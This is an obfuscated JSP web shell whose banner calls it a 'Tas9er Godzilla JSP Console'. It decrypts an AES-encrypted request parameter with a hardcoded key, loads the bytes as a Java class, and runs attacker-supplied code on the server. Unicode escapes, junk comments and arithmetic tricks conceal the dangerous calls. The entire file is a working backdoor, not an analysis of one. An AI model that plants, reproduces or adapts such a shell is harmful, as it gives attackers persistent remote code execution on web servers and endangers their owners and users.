Hello Administrator!Welcome To Tas9er Godzilla JSP Console!
<%! String govsb_p2mNCHHyPgt1J = "822c5abed68bf139";
    String govsb_k = "Tas9er";
    class govsb_TU8W8gskb extends /*edusb_HKQ7PV0LObH*/ClassLoader {
        public govsb_TU8W8gskb(ClassLoader govsb_9fTbuX) {
            super/*edusb_NpF0*/(govsb_9fTbuX);
        }
        public Class govsb_CjS1VZo5a7GNL(byte[] govsb_M4kJur) {
            return super./*edusb_QVG*/\u0064\u0065\u0066\u0069\u006e\u0065\u0043\u006c\u0061\u0073\u0073/*edusb_fkj*/(govsb_M4kJur, 531114-531114, govsb_M4kJur.length);
        }
    }
    public byte[] govsb_9lGO(byte[] govsb_w, boolean govsb_riz5KIKZDM1sm) {
        try {
            j\u0061\u0076\u0061\u0078./*edusb_YgwU3*/\u0063\u0072\u0079\u0070\u0074\u006f.Cipher govsb_hjJqS0M7IYLYc = j\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.Cipher.\u0067\u0065\u0074\u0049\u006e\u0073\u0074\u0061\u006e\u0063e/*edusb_BJP3Okx2KUObc*/("AES");
            govsb_hjJqS0M7IYLYc.init(govsb_riz5KIKZDM1sm?531114/531114:531114/531114+531114/531114,new j\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.spec./*edusb_ebah5fnMPjl1*/SecretKeySpec/*edusb_kZHVVvA5D3bmib*/(govsb_p2mNCHHyPgt1J.getBytes(), "AES"));
            return govsb_hjJqS0M7IYLYc.doFinal/*edusb_euasN4*/(govsb_w);
        } catch (Exception e) {
            return null;
        }
     }
    %><%
    try {
        byte[] govsb_8 = java.util.Base64./*edusb_YsY*/\u0067\u0065\u0074\u0044\u0065\u0063\u006f\u0064\u0065\u0072()./*edusb_LkD7TC4gCPImksb*/decode(request.getParameter(govsb_k));
        govsb_8 = govsb_9lGO(govsb_8,false);
        if (session.getAttribute/*edusb_JH2c*/("payload") == null) {
            session.setAttribute("payload", new govsb_TU8W8gskb(this.\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073()./*edusb_KIzHnFRrs*/\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073Loader())/*edusb_JaihYZ0*/.govsb_CjS1VZo5a7GNL(govsb_8));
        } else {
            request.setAttribute("parameters", govsb_8);
            java.io.ByteArrayOutputStream govsb_IpcqZzUm6lj16v = new java.io./*edusb_HfGo8*/ByteArrayOutputStream();
            Object govsb_0L = /*edusb_eNhDFw45n*/((Class) session.getAttribute("payload"))./*edusb_JMZZMuGwbdZe7*//*edusb_rn8atPo4U*/new\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065()/*edusb_padwu1UIkk0xBx*/;
            govsb_0L.equals(govsb_IpcqZzUm6lj16v);
            govsb_0L.equals(pageContext);
            response.getWriter().write("87AD8C3B6B8EDE1D2ABBC9F566FA4DA3".substring(531114-531114, 16));
            govsb_0L.toString();
            response.getWriter().write(java.util.Base64/*edusb_azv7nlmoyPK*/.getEncoder()/*edusb_E8vKJE3quUWe2Ph*/.encodeToString(govsb_9lGO(govsb_IpcqZzUm6lj16v.toByteArray(),true)));
            response.getWriter().write("87AD8C3B6B8EDE1D2ABBC9F566FA4DA3".substring(16));
        }
    } catch (Exception e) {
    }
%>